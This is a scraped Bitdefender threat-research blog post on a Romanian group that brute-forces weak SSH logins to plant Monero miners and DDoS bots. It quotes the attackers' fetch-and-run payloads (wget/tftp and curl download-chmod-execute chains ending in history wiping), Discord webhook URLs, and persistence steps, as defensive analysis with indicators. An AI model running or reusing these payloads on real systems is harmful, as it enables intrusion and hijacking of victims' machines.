<!----> <div class="tw-container tw-mt-12"><div></div> <div class="tw-gap-7 lg:tw-flex"><div class="tw-mx-auto lg:tw-w-2/3"><div class="tw-mb-2 tw-items-center sm:tw-flex"><div class="tw-mb-2.5 tw-flex tw-flex-wrap tw-items-center tw-text-xs tw-font-bold tw-uppercase !tw-mb-0" style="color:#006DFF;"><a href="/en-us/blog/labs/tag/antimalware-research" title="Anti-Malware Research" class="tw-py-1 tw-relative tw-mr-4 after:tw-absolute after:tw-top-0 after:tw-bottom-0 after:tw--right-2.5 after:tw-m-auto after:tw-mr-0 after:tw-block after:tw-h-1 after:tw-w-1 after:tw-rounded-full after:tw-bg-current last:tw-mr-0 last:after:tw-hidden ">Anti-Malware Research
      </a><!----><!----><!----> <!----></div> <div class="tw-mt-2.5 tw-flex tw-flex-wrap tw-items-center tw-text-sm !tw-mt-0"><!----> <div><!----> <!----></div> <div class="tw-relative tw-ml-5 tw-flex tw-items-center before:tw-absolute before:tw-top-0 before:tw-bottom-0 before:tw--left-3 before:tw-m-auto before:tw-block before:tw-h-1 before:tw-w-1 before:tw-rounded-full before:tw-bg-[#595959] sm:first:before:tw-hidden"><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 23 23" overflow="visible" class="tw-text-[#595959]"><path d="M11.5 2c5.2 0 9.5 4.3 9.5 9.5S16.7 21 11.5 21 2 16.7 2 11.5 6.3 2 11.5 2m0-2C5.1 0 0 5.1 0 11.5S5.1 23 11.5 23 23 17.9 23 11.5 17.9 0 11.5 0z" style="fill: currentColor"></path> <path d="M11.5 6.6v4.5M12 12.1l3.5 3.2" class="st0"></path></svg> <span class="tw-pl-2">
             10 min read
         </span></div> <div class="tw-py-1 tw-relative tw-ml-5 before:tw-absolute before:tw-top-0 before:tw-bottom-0 before:tw--left-3 before:tw-m-auto before:tw-block before:tw-h-1 before:tw-w-1 before:tw-rounded-full before:tw-bg-[#595959]"><button aria-label="Add to bookmark" class="tw-block tw-text-base"><svg xmlns="http://www.w3.org/2000/svg" width="20" viewBox="0 0 50.9 52.1" overflow="visible" class="tw-w-[1em] tw-h-[1em]"><path d="M3.4 2.5h34.3c.4 0 .7.4.7.8v45.2c0 .6-.6.9-.9.5L21.1 37.3c-.4-.3-.8-.3-1.2 0L3.4 49.5c-.4.4-.9.1-.9-.5l.2-45.7c0-.4.3-.8.7-.8z" fill="#fff" stroke="#adb5b9" stroke-width="5" stroke-miterlimit="10"></path></svg> <!----></button></div></div></div> <h1 class="tw-text-3xl tw-font-bold md:tw-text-4xl md:tw-leading-tight xl:tw-text-5xl xl:tw-leading-tight">
               How We Tracked a Threat Group Running an Active Cryptojacking Campaign
            </h1> <div class="tw-mt-3 tw-items-center tw-text-sm sm:tw-flex"><div class="sm:tw-w-1/3"><div class="tw-mt-2.5 tw-flex tw-flex-wrap tw-items-center tw-text-sm"><a href="/en-us/blog/labs/author/bitdefenderteam" title="Bitdefender" class="tw-overflow-hidden tw-rounded-full tw-h-11 tw-w-11"><img width="50" height="50" alt="Bitdefender" title="Bitdefender" data-src="https://blogapp.bitdefender.com/labs/content/images/size/w100/2022/02/logo_bd_social.png" class="tw-h-full tw-w-full tw-object-cover"></a> <div class="tw-pl-2"><div class="tw-flex tw-flex-wrap tw-gap-x-2"><a href="/en-us/blog/labs/author/bitdefenderteam" title="Bitdefender" class="tw-py-1 tw-mr-1.5 last:tw-mr-0">Bitdefender
         </a></div> <p style="color:#757575;">
         July 14, 2021
      </p></div> <!----> <!----></div></div> <div class="tw-mt-4 sm:tw-mt-0 sm:tw-w-2/3"><div class="tw-flex tw-gap-2 tw-rounded tw-bg-[#f4f7fa] tw-p-2 tw-text-xs"><em class="tw-text-[10px]">Promo</em> <div><span class="pe-2">Protect all your devices, without slowing them down.</span> <br> <a target="_blank" href="../../Downloads/" class="tw-text-[#0069F5]">Free 30-day trial</a></div></div></div></div> <picture class="tw-my-6"><source data-not-lazy="" media="(max-width: 600px)" data-srcset="https://blogapp.bitdefender.com/labs/content/images/size/w600/2021/07/Group-of-Teenage-Hackers-Organize-Attack-on-Corporate-Data-Servers.-Their-Lair-is-Dark-and-Full-of-Operating-Displays.-817486038_5000x2813.jpeg"> <source data-not-lazy="" media="(min-width: 701px)" data-srcset="https://blogapp.bitdefender.com/labs/content/images/size/w1000/2021/07/Group-of-Teenage-Hackers-Organize-Attack-on-Corporate-Data-Servers.-Their-Lair-is-Dark-and-Full-of-Operating-Displays.-817486038_5000x2813.jpeg"> <img data-not-lazy="" data-src="https://blogapp.bitdefender.com/labs/content/images/size/w600/2021/07/Group-of-Teenage-Hackers-Organize-Attack-on-Corporate-Data-Servers.-Their-Lair-is-Dark-and-Full-of-Operating-Displays.-817486038_5000x2813.jpeg" alt="How We Tracked a Threat Group Running an Active Cryptojacking Campaign" title="How We Tracked a Threat Group Running an Active Cryptojacking Campaign" width="600" height="400" src="https://blogapp.bitdefender.com/labs/content/images/size/w600/2021/07/Group-of-Teenage-Hackers-Organize-Attack-on-Corporate-Data-Servers.-Their-Lair-is-Dark-and-Full-of-Operating-Displays.-817486038_5000x2813.jpeg" class="tw-my-4 tw-w-full"></picture> <div class="content tw-mb-12 tw-text-lg tw-text-black"><p>Bitdefender security researchers have discovered a threat group likely based in Romania that's been active since at least 2020. They've been targeting Linux-based machines with weak SSH credentials, mainly to deploy Monero mining malware, but their toolbox allows for other kinds of attacks.</p><p>Hackers going after weak SSH credentials is not uncommon. Among the biggest problems in security are default user names and passwords, or weak credentials hackers can overcome easily with brute force. The tricky part is not necessarily brute-forcing those credentials but doing it in a way that lets attackers go undetected.</p><p>Like any other threat group, the tools and methods they use can identify them. In this case, their activity involves obfuscating Bash scripts by compiling them with a shell script compiler (shc) and using Discord to report the information back.</p><p>In addition to traditional tools such as <code>masscan</code> and <code>zmap</code>, the threat actors' toolkit includes a previously unreported SSH bruteforcer written in Golang. This tool appears to be distributed on an as-a-service model, as it uses a centralized API server. Each threat actor supplies their API key in their scripts. Like most other tools in this kit, the brute force tool has its interface in a mix of Romanian and English. This leads us to believe that its author is part of the same Romanian group.</p><p><strong>Introduction</strong></p><p>We started investigating this group in May 2021 because of their cryptojacking campaign with the <code>.93joshua</code> loader. Surprisingly, we traced the malware easily to <code>http://45[.]32[.]112[.]68/.sherifu/.93joshua</code> in an open directory. It turns out that the server hosted other files. Although the group hid many of the files, their inclusion in other scripts revealed their presence. The associated domain, mexalz.us, has hosted malware at least since February 2021.</p><p>The front page of <code>45[.]32[.]112[.]68</code>:</p><figure class="kg-card kg-image-card"><img src="https://blogapp.bitdefender.com/labs/content/images/2021/07/1-1.png" class="kg-image" alt="" loading="lazy" width="995" height="657" srcset="https://blogapp.bitdefender.com/labs/content/images/size/w600/2021/07/1-1.png 600w, https://blogapp.bitdefender.com/labs/content/images/2021/07/1-1.png 995w" sizes="(min-width: 720px) 720px"></figure><p>The front page of mexalz.us:</p><figure class="kg-card kg-image-card"><img src="https://blogapp.bitdefender.com/labs/content/images/2021/07/2-1.png" class="kg-image" alt="" loading="lazy" width="1001" height="835" srcset="https://blogapp.bitdefender.com/labs/content/images/size/w600/2021/07/2-1.png 600w, https://blogapp.bitdefender.com/labs/content/images/size/w1000/2021/07/2-1.png 1000w, https://blogapp.bitdefender.com/labs/content/images/2021/07/2-1.png 1001w" sizes="(min-width: 720px) 720px"></figure><p>The following tree shows an aggregated representation of the files currently or formerly hosted on mexalz[.]us:</p><!--kg-card-begin: markdown--><pre><code>mexalz.us
|-- .sherifu/
|   |   .93joshua
| &nbsp; |  &nbsp;.k4m3l0t
|   |   .purrple
| &nbsp; |  &nbsp;.zte_error
|   |   find.sh
| &nbsp; |-- jack.tar.gz
|   |   |-- .jack1992/
|   |   |   |   brute
|   |   |   |   dabrute
|   |   |   |   lists/
|   |   |   |   mass
|   |   |   |   masscan
|   |   |   |   pass
|   |   | &nbsp; |  &nbsp;ranges_1.lst
| &nbsp; |  &nbsp;juanito.tar.gz
| &nbsp; |  &nbsp;|-- .juanito/
|   |   |   |   brute
|   |   |   |   go
|   |   |   |   pass
|   |   |   |   ps2
|   |   |   |   r
| &nbsp; |  &nbsp;kamelot.tar.gz
|   |   |-- .md/
|   |   |   go
|   |   |   haiduc
|   |   |   pass
|   |   satan.db
| &nbsp; |  &nbsp;scn.tar.gz
|   |   |-- .md/
|   |   |   go
|   |   |   haiduc
|   |   |   pass
|   |   sefu
| &nbsp; |  &nbsp;skamelot.tar.gz
| &nbsp; |  &nbsp;|-- .b87kamelot/
|   |   |   |   99x
|   |   |   |   go
|   |   |   |   p
|   |   |   |   r
|   |   sky
|-- .mini
| &nbsp; |  &nbsp;.black
|   |   .report_system
| &nbsp; |  &nbsp;PhoenixMiner.tar
|   |   banner
|   |   ethminer.tar
|   |   masscan
</code></pre>
<!--kg-card-end: markdown--><p>We'll be focusing on the original tools in this kit. Some of the files deserve special mention, as they can be connected to attacks seen in the wild.</p><p>The files <code>sefu</code> (bash script) and <code>satan.db</code> (gzip archive) are used to propagate the <code>chernobyl</code> Demonbot variant, which is hosted on a different server. The infection payload follows these simple steps:</p><!--kg-card-begin: markdown--><pre><code>cd /tmp cd /run cd /;
wget http://194[.]33[.]45[.]197:8080/chernobyl/chernobyl.sh;
chmod 777 chernobyl.sh;
sh chernobyl.sh chernobyl;
tftp 194[.]33[.]45[.]197 -c get chernobyltftp1.sh;
chmod 777 chernobyltftp1.sh;
sh chernobyltftp1.sh chernobyl;
tftp -r chernobyltftp2.sh -g 194[.]33[.]45[.]197;
chmod 777 chernobyltftp2.sh;
sh chernobyltftp2.sh chernobyl;
rm -rf chernobyl.sh chernobyltftp1.sh chernobyltftp2.sh;
rm -rf *;
history -c
</code></pre>
<!--kg-card-end: markdown--><p><code>sky</code> is a common Perl IRC bot, customized only in respect to the server details and used nicknames. Its C2 is at <code>area17[.]mexalz[.]us:6667</code>.</p><figure class="kg-card kg-image-card"><img src="https://blogapp.bitdefender.com/labs/content/images/2021/07/sky_configuration--1-.png" class="kg-image" alt="" loading="lazy"></figure><p><strong>Finding the victims</strong></p><p>There's no shortage of compromisable Linux machines with weak SSH credentials. The trick is to find them, and that's done through scanning. Attackers host several archives on the server, including <code>jack.tar.gz</code>, <code>juanito.tar.gz</code>, <code>scn.tar.gz</code> and <code>skamelot.tar.gz</code>.</p><p>These contain toolchains for cracking servers with weak SSH credentials. We can separate this process into three stages:</p><!--kg-card-begin: markdown--><ul>
<li>reconnaissance: identifying SSH servers via port scanning and banner grabbing</li>
<li>credential access: identifying valid credentials via brute-force</li>
<li>initial access: connecting via SSH and executing the infection payload</li>
</ul>
<!--kg-card-end: markdown--><p>Depending on the stage, the attackers use different tools. For example, <code>ps</code> and <code>masscan</code> are used for reconnaissance, while <code>99x</code> / <code>haiduc</code> (both Outlaw malware) and `brute` are used for credential access and initial access.</p><p>In the currently live campaign, the attackers use the `skamelot.tar.gz`, which includes the following files:</p><!--kg-card-begin: markdown--><ul>
<li><code>r</code> (SHC compiled script) iterates through IP classes and runs <code>go</code></li>
<li><code>go</code> (SHC compiled script) runs <code>99x</code> (haiduc) with the infection payload</li>
<li><code>p</code> is a list of attempted credentials</li>
</ul>
<!--kg-card-end: markdown--><p>The infection payload executed in the SSH sessions is:</p><p><code>curl -O http://45[.]32[.]112[.]68/.sherifu/.93joshua &amp;&amp; chmod 777 .93joshua &amp;&amp; ./.93joshua &amp;&amp; uname -a</code></p><p>Note: This file is still online, but attackers relocated to <code>mexalz.us</code>.</p><p><strong>It all begins with a loader</strong></p><p>After the attackers find and enter into a Linux device with inadequate SSH credentials, they deploy and execute the loader. In the current campaign, they use <code>.93joshua</code>, but they have a couple of others at their disposal; <code>.purrple</code> and <code>.black</code>. All of the loaders are obfuscated via <code>shc</code>.</p><p>The loader gathers system information and relays it to the attacker using an HTTP POST to a Discord webhook. By using Discord, the threat actors circumvent the need to host their own command-and-control server, as webhooks are means to post data on Discord channel programmatically. The gathered data can also be conveniently viewed on a channel.</p><p>Discord is increasingly popular among threat actors because of this functionality, as it involuntarily provides support for malware distribution (use of its CDN), command-and-control (webhooks) or creating communities centered around buying and selling malware source code and services (e.g. DDoS).</p><p>The information gathered at this step lets the threat actor witness the effectiveness of their tools in infecting machines. The list of victims may also be collected to carry out potential post-exploitation steps.</p><figure class="kg-card kg-image-card"><img src="https://blogapp.bitdefender.com/labs/content/images/2021/07/3.png" class="kg-image" alt="" loading="lazy" width="419" height="184"></figure><p>In another step of its operation, the loader alters the shell configuration, overwriting the <code>.bashrc</code> and <code>.bash_profile</code> files. The auxiliary file <code>/usr/.SQL-Unix/.SQL/.db</code>, used to store part of the commands, is executed via the source built-in in <code>.bashrc</code>. This script, in turn, contains commands that overwrite <code>.bashrc</code>.</p><figure class="kg-card kg-image-card"><img src="https://blogapp.bitdefender.com/labs/content/images/2021/07/4.png" class="kg-image" alt="" loading="lazy" width="417" height="542"></figure><p>Several shell commands are disabled using bash aliases. The purpose of these configurations is to render the shell inoperable to other operators, whether they are competing in the realms of malware or they’re legitimate users of the system.</p><p>The attackers also try to achieve persistence so the loader drops some redundant scripts. Their names differ between versions of the loader, so we will refer to those in the <code>.93joshua</code> script:</p><!--kg-card-begin: markdown--><p>· <code>.k93</code> is used to launch the miner (.k4m3l0t)<br>
· <code>/usr/bin/sshd</code> is a <code>systemd</code> service script that launches .k93<br>
· <code>.5p4rk3l5</code> is a crontab file that executes <code>.93joshua</code> and <code>.k93</code></p>
<!--kg-card-end: markdown--><p>Several persistence methods are employed:</p><!--kg-card-begin: markdown--><p>· creating a user and adding it to the sudo group; various names are used: <code>gh0stx</code>, <code>sclipicibosu</code>, <code>mexalzsherifu</code><br>
· adding a SSH key to <code>authorized_keys</code> (attackers cycled through three different keys depending on the script)<br>
· creating a <code>systemd</code> service called <code>myservice</code> which runs the <code>/usr/bin/sshd</code> script:</p>
<!--kg-card-end: markdown--><figure class="kg-card kg-image-card"><img src="https://blogapp.bitdefender.com/labs/content/images/2021/07/5.png" class="kg-image" alt="" loading="lazy" width="640" height="583" srcset="https://blogapp.bitdefender.com/labs/content/images/size/w600/2021/07/5.png 600w, https://blogapp.bitdefender.com/labs/content/images/2021/07/5.png 640w"></figure><p><strong>Mining for Monero</strong></p><p>All of this effort is currently directed towards Monero mining. While the current campaign concerns cryptojacking, we have connected this group to several DDoS botnets: a Demonbot variant called <code>chernobyl</code> and a Perl IRC bot.</p><p>As you all know, mining for cryptocurrency is slow and tedious, but it can go faster when using multiple systems. Owning multiple systems for mining is not cheap, so attackers try the next best thing: to remotely compromise devices and use them for mining instead.</p><p>In this case, the group uses custom compiled binaries with embedded configurations of a legitimate miner named <a href="https://github.com/xmrig/xmrig">XMRig</a>. Typically, the JSON configuration file, which also includes the users and where the currency goes, is external. But in this compiled version, the configuration file in embedded.</p><figure class="kg-card kg-image-card"><img src="https://blogapp.bitdefender.com/labs/content/images/2021/07/6.png" class="kg-image" alt="" loading="lazy" width="1128" height="166" srcset="https://blogapp.bitdefender.com/labs/content/images/size/w600/2021/07/6.png 600w, https://blogapp.bitdefender.com/labs/content/images/size/w1000/2021/07/6.png 1000w, https://blogapp.bitdefender.com/labs/content/images/2021/07/6.png 1128w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="https://blogapp.bitdefender.com/labs/content/images/2021/07/7.png" class="kg-image" alt="" loading="lazy"></figure><p><strong>Unfortunately, brute force still works</strong></p><p>People are the simple reason why brute-forcing SSH credentials still works. Dedicated tools are required for this process, and, in this situation, it's something developed by the group itself.</p><p>This tool, which its author dubbed "Diicot brute", is contained in <code>jack.tar.gz</code> and <code>juanito.tar.gz</code> archives.</p><p>As the usage string from the binary shows, it takes as command-line arguments a port, an "API key", number of threads, a file containing a list of IP addresses to be scanned, and a timeout value (seconds).</p><p><code>Syntax: ./brute [ Port ] [ Key ] [ Routines ] [ IP File ] [ Timeout ]</code></p><p>Written in Golang, the binary was developed in a single package, which contains the following functions:</p><figure class="kg-card kg-image-card"><img src="https://blogapp.bitdefender.com/labs/content/images/2021/07/8.png" class="kg-image" alt="" loading="lazy" width="440" height="203"></figure><p>While most of the tools used by Mexalz can be used by themselves, the "Diicot bruter" is meant to operate on a SaaS (software as a service) model. The binary communicates with three servers:</p><!--kg-card-begin: markdown--><ul>
<li>an update server (cdn[.]arhive[.]online)</li>
<li>an API server (requests[.]arhive[.]online)</li>
<li>Discord API servers</li>
</ul>
<!--kg-card-end: markdown--><p>The tool requires an "API key", supplied as a command-line argument. The key is provided as a parameter in the API endpoints used to retrieve the user's configuration. The configuration includes the user's Discord ID, a Discord webhook where the tool's output is POSTed, and a version number (presumably, the latest version to which the user is licensed to use).</p><p>The <code>dabrute</code> and <code>go</code> scripts contain keys of this type. Rather than random strings, they look like user names and differ between the two instances, strengthening the assumption that the owners of this toolkit are distinct individuals belonging to the same threat group that share tools among themselves.</p><p>Discord hooks are used to report on:</p><!--kg-card-begin: markdown--><ul>
<li>the start and finish of the tool's execution</li>
<li>successful exploitations</li>
</ul>
<!--kg-card-end: markdown--><p>Two types of hooks are used: user-dependent, which are retrieved from the API server using the API key, and global, which are hardcoded.</p><p>The global hooks are:</p><!--kg-card-begin: markdown--><ul>
<li><a href="https://discord">https://discord</a>[.]com/api/webhooks/796089316517347369/zRjSflkA7z9C4N9PaPWIJQFLMSKGk5iJNv9T_Z880jhLOpkQ3OEGsbdz4GsX80WwRY0g</li>
<li><a href="https://discord">https://discord</a>[.]com/api/webhooks/845977569446068234/ggGoh-5DEpMLtIi0OKNc8z3b3MgxjZaxovL0R0dBiMsP0hnMTIkNx_JoFTLKJtbyRSx</li>
</ul>
<!--kg-card-end: markdown--><p>The <code>main.remoteRun</code> function is executed in a dedicated goroutine (lightweight thread) for each (host, username, password) combination. The implementation of the SSH protocol is provided by the standard library package <code>golang.org/x/crypto/ssh</code>.</p><p>After a successful authentication, the following bash commands are executed in the session with the purpose of collecting system information:</p><!--kg-card-begin: markdown--><pre><code>uname -s -v -n -r -m
uptime | grep -ohe 'up .*' | sed 's/,//g' | awk '{ print $2\" \"$3 }'
uptime | grep -ohe '[0-9.*] user[s,]'
lscpu | sed -nr '/Model name/ s/.*:\\s*(.*) @ .*/\\1/p'
nproc --all
nvidia-smi -q | grep \"Product Name\"
lspci
cut -d: -f6 /etc/passwd | grep \"/home/\"
</code></pre>
<!--kg-card-end: markdown--><p>Notably, one of the commands intends to discover the GPU model, which would be useful to judge the victim's potential in a cryptojacking scheme.</p><p>Owing to an auto-update feature in the binaries, we managed to locate where it is hosted and gain insight into how it is distributed. The update server is set up using Github pages.</p><p>The repository is revealed by following the redirect chain:</p><!--kg-card-begin: markdown--><ul>
<li>cdn[.]arhive[.]online/brute -&gt; developer60-stack.github.io/payload.github.io/cdn/brute</li>
</ul>
<!--kg-card-end: markdown--><p>The repository (github.com/developer60-stack/payload.github.io) contains:</p><!--kg-card-begin: markdown--><ul>
<li>setup, an example usage of the <code>brute</code> tool that chains the <code>zmap</code> port scanner, a banner grabber and a stage for filtering out SSH servers that do not accept password authentication</li>
<li><code>brute</code>, the compiled tool</li>
<li><code>install</code>, a script for installing dependencies and downloading the tool; both setup and install report after every execution stage to a Discord hook</li>
</ul>
<!--kg-card-end: markdown--><figure class="kg-card kg-image-card"><img src="https://blogapp.bitdefender.com/labs/content/images/2021/07/9.png" class="kg-image" alt="Github repository payload.github.io" loading="lazy"></figure><figure class="kg-card kg-image-card"><img src="https://blogapp.bitdefender.com/labs/content/images/2021/07/10.png" class="kg-image" alt="Repository tree" loading="lazy" width="172" height="144"></figure><p>Created on May 1 2021, the repository underwent 35 updates (commits).</p><p>An advertisement posted on the hacking forum cracked[.]to in November 2020 shows the price charged for this service and a collage of images showing its interface, including screenshots from the Discord channel.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blogapp.bitdefender.com/labs/content/images/2021/07/11.png" class="kg-image" alt="Advertisment on Cracked forum" loading="lazy"><figcaption>(censor not in original)</figcaption></figure><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blogapp.bitdefender.com/labs/content/images/2021/07/12.png" class="kg-image" alt="Advertisment on Cracked forum" loading="lazy" width="1132" height="117" srcset="https://blogapp.bitdefender.com/labs/content/images/size/w600/2021/07/12.png 600w, https://blogapp.bitdefender.com/labs/content/images/size/w1000/2021/07/12.png 1000w, https://blogapp.bitdefender.com/labs/content/images/2021/07/12.png 1132w" sizes="(min-width: 720px) 720px"><figcaption>(censor belongs to original)</figcaption></figure><p>The author claims that their tool can filter out honeypots, but this investigation is proof that it doesn't, or at least it couldn’t evade ours.</p><p>Our honeypot data shows attacks matching this tool's signature starting in January 2021. The IP addresses they originate from belong to a relatively small set, which tells us that the threat actors are not yet using compromised systems to propagate the malware (worm behavior).</p><p>More information about this threat actor can be freely provided to law enforcement agencies by reaching out to draco@bitdefender.com.</p><p><strong>Indicators of compromise</strong></p><p>Samples:</p><!--kg-card-begin: html--><table class="MsoNormalTable" border="1" cellspacing="0" cellpadding="0" style="border-collapse:collapse;border:none;mso-border-alt:solid windowtext .75pt;

{layout:"default",data:[{post:{id:"66d5c3d2d0ec1aefc7d72294",uuid:"7b0475ba-3cd2-44d0-a015-24ac3139e475",title:"How We Tracked a Threat Group Running an Active Cryptojacking Campaign",slug:"how-we-tracked-a-threat-group-running-an-active-cryptojacking-campaign",html:"\u003Cp\u003EBitdefender security researchers have discovered a threat group likely based in Romania that's been active since at least 2020. They've been targeting Linux-based machines with weak SSH credentials, mainly to deploy Monero mining malware, but their toolbox allows for other kinds of attacks.\u003C\u002Fp\u003E\u003Cp\u003EHackers going after weak SSH credentials is not uncommon. Among the biggest problems in security are default user names and passwords, or weak credentials hackers can overcome easily with brute force. The tricky part is not necessarily brute-forcing those credentials but doing it in a way that lets attackers go undetected.\u003C\u002Fp\u003E\u003Cp\u003ELike any other threat group, the tools and methods they use can identify them. In this case, their activity involves obfuscating Bash scripts by compiling them with a shell script compiler (shc) and using Discord to report the information back.\u003C\u002Fp\u003E\u003Cp\u003EIn addition to traditional tools such as \u003Ccode\u003Emasscan\u003C\u002Fcode\u003E and \u003Ccode\u003Ezmap\u003C\u002Fcode\u003E, the threat actors' toolkit includes a previously unreported SSH bruteforcer written in Golang. This tool appears to be distributed on an as-a-service model, as it uses a centralized API server. Each threat actor supplies their API key in their scripts. Like most other tools in this kit, the brute force tool has its interface in a mix of Romanian and English. This leads us to believe that its author is part of the same Romanian group.\u003C\u002Fp\u003E\u003Cp\u003E\u003Cstrong\u003EIntroduction\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\u003Cp\u003EWe started investigating this group in May 2021 because of their cryptojacking campaign with the \u003Ccode\u003E.93joshua\u003C\u002Fcode\u003E loader. Surprisingly, we traced the malware easily to \u003Ccode\u003Ehttp:\u002F\u002F45[.]32[.]112[.]68\u002F.sherifu\u002F.93joshua\u003C\u002Fcode\u003E in an open directory. It turns out that the server hosted other files. Although the group hid many of the files, their inclusion in other scripts revealed their presence. The associated domain, mexalz.us, has hosted malware at least since February 2021.\u003C\u002Fp\u003E\u003Cp\u003EThe front page of \u003Ccode\u003E45[.]32[.]112[.]68\u003C\u002Fcode\u003E:\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg original tools in this kit. Some of the files deserve special mention, as they can be connected to attacks seen in the wild.\u003C\u002Fp\u003E\u003Cp\u003EThe files \u003Ccode\u003Esefu\u003C\u002Fcode\u003E (bash script) and \u003Ccode\u003Esatan.db\u003C\u002Fcode\u003E (gzip archive) are used to propagate the \u003Ccode\u003Echernobyl\u003C\u002Fcode\u003E Demonbot variant, which is hosted on a different server. The infection payload follows these simple steps:\u003C\u002Fp\u003E\u003C!--kg-card-begin: markdown--\u003E\u003Cpre\u003E\u003Ccode\u003Ecd \u002Ftmp cd \u002Frun cd \u002F;\nwget http:\u002F\u002F194[.]33[.]45[.]197:8080\u002Fchernobyl\u002Fchernobyl.sh;\nchmod 777 chernobyl.sh;\nsh chernobyl.sh chernobyl;\ntftp 194[.]33[.]45[.]197 -c get chernobyltftp1.sh;\nchmod 777 chernobyltftp1.sh;\nsh chernobyltftp1.sh chernobyl;\ntftp -r chernobyltftp2.sh -g 194[.]33[.]45[.]197;\nchmod 777 chernobyltftp2.sh;\nsh chernobyltftp2.sh chernobyl;\nrm -rf chernobyl.sh chernobyltftp1.sh chernobyltftp2.sh;\nrm -rf *;\nhistory -c\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003C!--kg-card-end: markdown--\u003E\u003Cp\u003E\u003Ccode\u003Esky\u003C\u002Fcode\u003E is a common Perl IRC bot, customized only in respect to the server details and used nicknames. Its C2 is at \u003Ccode\u003Earea17[.]mexalz[.]us:6667\u003C\u002Fcode\u003E.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2021\u002F07\u002Fsky_configuration--1-.png\" class=\"kg-image\" alt loading=\"lazy\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003E\u003Cstrong\u003EFinding the victims\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\u003Cp\u003EThere's no shortage of compromisable Linux machines with weak SSH credentials. The trick is to find them, and that's done through scanning. Attackers host several archives on the server, including \u003Ccode\u003Ejack.tar.gz\u003C\u002Fcode\u003E, \u003Ccode\u003Ejuanito.tar.gz\u003C\u002Fcode\u003E, \u003Ccode\u003Escn.tar.gz\u003C\u002Fcode\u003E and \u003Ccode\u003Eskamelot.tar.gz\u003C\u002Fcode\u003E.\u003C\u002Fp\u003E\u003Cp\u003EThese contain toolchains for cracking servers with weak SSH credentials. We can separate this process into three stages:\u003C\u002Fp\u003E\u003C!--kg-card-begin: markdown--\u003E\u003Cul\u003E\n\u003Cli\u003Ereconnaissance: identifying SSH servers via port scanning and banner grabbing\u003C\u002Fli\u003E\n\u003Cli\u003Ecredential access: identifying valid credentials via brute-force\u003C\u002Fli\u003E\n\u003Cli\u003Einitial access: connecting via SSH and executing the infection payload\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C!--kg-card-end: markdown--\u003E\u003Cp\u003EDepending on the stage, the attackers use different tools. For example, \u003Ccode\u003Eps\u003C\u002Fcode\u003E and \u003Ccode\u003Emasscan\u003C\u002Fcode\u003E are used for reconnaissance, while \u003Ccode\u003E99x\u003C\u002Fcode\u003E \u002F \u003Ccode\u003Ehaiduc\u003C\u002Fcode\u003E (both Outlaw malware) and `brute` are used for credential access and initial access.\u003C\u002Fp\u003E\u003Cp\u003EIn the currently live campaign, the attackers use the `skamelot.tar.gz`, which includes the following files:\u003C\u002Fp\u003E\u003C!--kg-card-begin: markdown--\u003E\u003Cul\u003E\n\u003Cli\u003E\u003Ccode\u003Er\u003C\u002Fcode\u003E (SHC compiled script) iterates through IP classes and runs \u003Ccode\u003Ego\u003C\u002Fcode\u003E\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ccode\u003Ego\u003C\u002Fcode\u003E (SHC compiled script) runs \u003Ccode\u003E99x\u003C\u002Fcode\u003E (haiduc) with the infection payload\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ccode\u003Ep\u003C\u002Fcode\u003E is a list of attempted credentials\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C!--kg-card-end: markdown--\u003E\u003Cp\u003EThe infection payload executed in the SSH sessions is:\u003C\u002Fp\u003E\u003Cp\u003E\u003Ccode\u003Ecurl -O http:\u002F\u002F45[.]32[.]112[.]68\u002F.sherifu\u002F.93joshua &amp;&amp; chmod 777 .93joshua &amp;&amp; .\u002F.93joshua &amp;&amp; uname -a\u003C\u002Fcode\u003E\u003C\u002Fp\u003E\u003Cp\u003ENote: This file is still online, but attackers relocated to \u003Ccode\u003Emexalz.us\u003C\u002Fcode\u003E.\u003C\u002Fp\u003E\u003Cp\u003E\u003Cstrong\u003EIt all begins with a loader\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\u003Cp\u003EAfter the attackers find and enter into a Linux device with inadequate SSH credentials, they deploy and execute the loader. In the current campaign, they use \u003Ccode\u003E.93joshua\u003C\u002Fcode\u003E, but they have a couple of others at their disposal; \u003Ccode\u003E.purrple\u003C\u002Fcode\u003E and \u003Ccode\u003E.black\u003C\u002Fcode\u003E. All of the loaders are obfuscated via \u003Ccode\u003Eshc\u003C\u002Fcode\u003E.\u003C\u002Fp\u003E\u003Cp\u003EThe loader gathers system information and relays it to the attacker using an HTTP POST to a Discord webhook. By using Discord, the threat actors circumvent the need to host their own command-and-control server, as webhooks are means to post data on Discord channel programmatically. The gathered data can also be conveniently viewed on a channel.\u003C\u002Fp\u003E\u003Cp\u003EDiscord is increasingly popular among threat actors because of this functionality, as it involuntarily provides support for malware distribution (use of its CDN), command-and-control (webhooks) or creating communities centered around buying and selling malware source code and services (e.g. DDoS).\u003C\u002Fp\u003E\u003Cp\u003EThe information gathered at this step lets the threat actor witness the effectiveness of their tools in infecting machines. The list of victims may also be collected to carry out potential post-exploitation steps.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2021\u002F07\u002F3.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"419\" height=\"184\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EIn another step of its operation, the loader alters the shell configuration, overwriting the \u003Ccode\u003E.bashrc\u003C\u002Fcode\u003E and \u003Ccode\u003E.bash_profile\u003C\u002Fcode\u003E files. The auxiliary file 